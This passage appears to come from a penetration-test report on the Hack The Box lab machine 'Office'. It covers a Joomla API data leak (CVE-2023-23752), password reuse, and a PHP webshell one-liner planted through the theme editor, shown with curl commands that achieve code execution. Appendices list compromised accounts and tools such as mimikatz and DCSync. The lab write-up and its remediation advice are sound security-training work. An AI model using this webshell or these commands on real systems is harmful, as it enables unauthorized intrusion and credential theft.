    "next": "http://10.129.230.226/api/index.php/v1/config/application?public=true&page%5Boffset%5D=20&page%5Blimit%5D=20",
    "last": "http://10.129.230.226/api/index.php/v1/config/application?public=true&page%5Boffset%5D=60&page%5Blimit%5D=20"
  },
  "data": [
<SNIP>
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "user": "root",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "password": "<REDACTED>",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "db": "joomla_db",
        "id": 224
      }
<SNIP>
  ],
  "meta": {
    "total-pages": 4
  }
}                                                                               

```

```
"type": "application"...
    "user": "root",
    "password": "<REDACTED>",
    "db": "joomla_db",
```


 The tester also leveraged the same vulnerability to leak the Administrator's name, username and email. 
```console?prompt=$
└─$ curl http://10.129.230.226/api/index.php/v1/users?public=true

{"links":{"self":"http:\/\/10.129.230.226\/api\/index.php\/v1\/users?public=true"},"data":[{"type":"users","id":"474","attributes":{"id":474,"name":"Tony Stark","username":"Administrator","email":"Administrator@holography.htb","block":0,"sendEmail":1,"registerDate":"2023-04-13 23:27:32","lastvisitDate":"2024-01-24 13:00:47","lastResetTime":null,"resetCount":0,"group_count":1,"group_names":"Super Users"}}],"meta":{"total-pages":1}}
```



### 6. Abusing Built-in Functionality to Achieve RCE(Remote Code Execution)

| CWE                               | [CWE-749: Exposed Dangerous Method or Function](https://cwe.mitre.org/data/definitions/749.html)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| --------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| CVSS 3.1 Score                    | [6.7](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:L/A:H&version=3.1)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| Description (Incl. Root<br>Cause) | Through the build in theme template management options of the `Joomla!` blog service, it is possible to modify any themes PHP file to include a malicious PHP webshell. Adding a PHP webshell to any PHP file, it is possible to execute arbitrary code on the underlying system hosting the `Joomla!` webservice by visiting the theme specific URL and sending a command through URL parameters.                                                                                                                                                                                                                                                                                                                                 |
| Security Impact                   | An attacker who can gain unauthorized access to a `Joomla!` administrator account can potentially hide a malicious PHP webshell within one of the theme pages via the theme template editor in the administrator panel. A malicious PHP webshell placed in a theme page may then be leveraged to gain un-authorized remote code execution on the underlying machine running the service. An attacker can further leverage this to execute a reverse-shell payload that will grant a semi-interactive shell, giving the ability to upload malicious programs or enumerate users, files, and services on the system.                                                                                                                 |
| Affected Resource                 | (TCP/80) 10.129.230.226                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| Remediation                       | Due to the fact that this is an abuse of built-in functionality makes it difficult to specifically harden. Instead, to limit impact and potential of abuse, hardening the Joomla service in general is the recommended route. <br><br>This includes ensuring the administrator account is protected with a strong password and is not re-used with other services. <br><br>Further, consider limiting access to the `/administrator` endpoint by IP address. This can be done by adding a `.htaccess` file in the root /administrator/ directory and setting `deny from all` on the directory while setting `Allow from x.x.x.x` for the administrators IP address, effectively only allowing requests from specific IP addresses. |
| External References               | https://attack.mitre.org/techniques/T1548/<br><br>https://docs.joomla.org/Security_Checklist/Joomla!_Setup                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |

Finding Evidence:

The tester previously discovered credentials for the `tstark` AD domain user.
```console?prompt=$
└─$ nxc smb 10.129.230.226 -u 'tstark' -p '<REDACTED>'         
SMB         10.129.230.226  445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
SMB         10.129.230.226  445    DC               [+] office.htb\tstark:<REDACTED>
```

The tester recalled the previous Joomla enumeration, which had listed `Tony Stark` as the administrator account on Joomla
```console?prompt=$
└─$ curl http://10.129.230.226/api/index.php/v1/users?public=true
<SNIP>
"attributes":{"id":474,"name":"Tony Stark","username":"Administrator","email":"Administrator@holography.htb",...<SNIP>
```

The tester leveraged this knowledge and discovered password-reuse on the `tstark` account between the Active Directory Environment and the Joomla service.
![Joomla Administration Portal](assets/images/office/joomla-admin-panel.png)

With administrator access to the Joomla service, the tester navigated to System->Site Templates and customized the `FILE.PHP` theme file to append a PHP web-shell
`system($_GET['cmd_rand_b67e1aac-cf7c-4feb-a46f-03f5da39e725']);`

NOTE: A random UUID was generated for the PHP web-shell URL parameter to avoid potential drive-by attacks or further compromise by attackers fuzzing parameters on the Joomla service pages during the assessment timeline. 
![Joomla Theme Template Editor](assets/images/office/joomla-theme-editor.png)


The tester makes a GET request to the modified offline.php endpoint, this resulted in remote code execution on the `DC` host as the `office\web_account` user.
```console?prompt=$
└─$ curl http://10.129.230.226/templates/cassiopeia/offline.php?cmd_rand_b67e1aac-cf7c-4feb-a46f-03f5da39e725=whoami
office\web_account
```



--- 

## Appendices

---
### Appendix A - Finding Severities:
Explain different of high, medium, low ratings.


| Rating                 | Severity Rating Definition                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| ---------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Critical<br>(9.0-10.0) | Exploiting this vulnerability can lead to catastrophic consequences, including complete organizational paralysis, severe financial loss, and irreversible damage to reputation. The risk exposure is extreme due to the potential for widespread system compromise and the high likelihood of targeted attacks by sophisticated threat actors. Existing security controls are inadequate, offering no effective mitigation against the profound impacts of exploitation. |
| High<br>(7.0-8.9)      | Exploiting this vulnerability can cause major harm, such as significant financial, legal, or reputational damage. Overall risk exposure is high, making it more likely to be targeted and exploited. Security controls are weak and protective measures are not strong enough to reduce the impact significantly.                                                                                                                                                        |
| Medium<br>(4.0-6.9)    | Exploiting this vulnerability could significantly impact system confidentiality, integrity, or availability. The threat exposure is elevated making exploitation more probable to occur. Security measures exist to prevent further damage and contain the severity of impact.                                                                                                                                                                                           |
| Low<br>(0.1-3.9)       | Exploiting this vulnerability poses minimal risk to operations and sensitive data, posing little threat to Confidentiality, Integrity and Availability. The overall exposure is minimal, making likelihood of exploitation is low. Effective security measures are in place to limit the impact and control any further damage.                                                                                                                                          |
| Info                   | No direct impact; this rating is used for informational purposes to highlight potential issues and security findings that have no impact on security or do not pose any immediate threat.                                                                                                                                                                                                                                                                                |

---

### Appendix B - Exploited Hosts


| Host | Domain/Scope | Method                                                                                               |
| ---- | ------------ | ---------------------------------------------------------------------------------------------------- |
| `DC` | `office.htb` | - Vulnerable Web Service<br>- Sensitive Auth Info on SMB Share<br>- Excessive Domain User Privileges |

---

### Appendix C - Compromised Users

| User                  | Info                              | Method                                                                                                     |
| --------------------- | --------------------------------- | ---------------------------------------------------------------------------------------------------------- |
| `joomla_db`           | Joomla! MySQL DB user             | CVE-2023-23752                                                                                             |
| `dwolfe`              | `OFFICE.HTB` Domain User          | Password re-use from `joomla_db` user                                                                      |
| `tstark`              | `OFFICE.HTB` Domain User          | Offline password cracking from Pre-Auth info retrieved from `SOC Analysis` network share.                  |
| `web_account`         | `OFFICE.HTB` Domain User          | PHP webshell via Joomla! admin theme editor. Password re-use on Joomla admin portal from `tstark` AD user. |
| `ppotts`              | `OFFICE.HTB` Domain User          | Malicious OpenOffice macro uploaded through job application web portal.                                    |
| `hhogan`              | `OFFICE.HTB` Domain User          | Saved credentials on `ppotts` domain account                                                               |
| `NT AUTHORITY\System` | `DC` Host SYSTEM account          | `psexec.py` using temp added local administrator account.                                                  |
| `Administrator`       | `OFFICE.HTB` Domain Administrator | DCSync attack from `DC.OFFICE.HTB`                                                                         |
| `EWhite`              | `OFFICE.HTB` Domain User          | DCSync attack from `DC.OFFICE.HTB`                                                                         |
| `etower`              | `OFFICE.HTB` Domain User          | DCSync attack from `DC.OFFICE.HTB`                                                                         |
| `dmichael`            | `OFFICE.HTB` Domain User          | DCSync attack from `DC.OFFICE.HTB`                                                                         |
| `dlanor`              | `OFFICE.HTB` Domain User          | DCSync attack from `DC.OFFICE.HTB`                                                                         |

---

### Appendix D - Changes/Cleanup

Throughout the engagement, all changes to the environment were cleaned up, this included:
- PHP web-shell placed in the Joomla Cassiopeia theme endpoint: `/templates/cassiopeia/offline.php`
- Binaries uploaded to the `DC.office.htb` host, including: `mimikatz.exe`, ligolo-ng's `agent.exe`, and `Invoke-RunasCs.ps1`.
- The `TesterTempUser958` local administrator account added to the `DC` host.

---

### Appendix E - Additional References

- Hack The Box - [Penetration testing reports: A powerful template and guide](https://www.hackthebox.com/blog/penetration-testing-reports-template-and-guide)
	- For lessons in how to write a penetration test report. This resource was used for general guidance and the report is loosely based on the template provided by the HTB Blog post(Primarily section titles and overall flow of the report.)

---

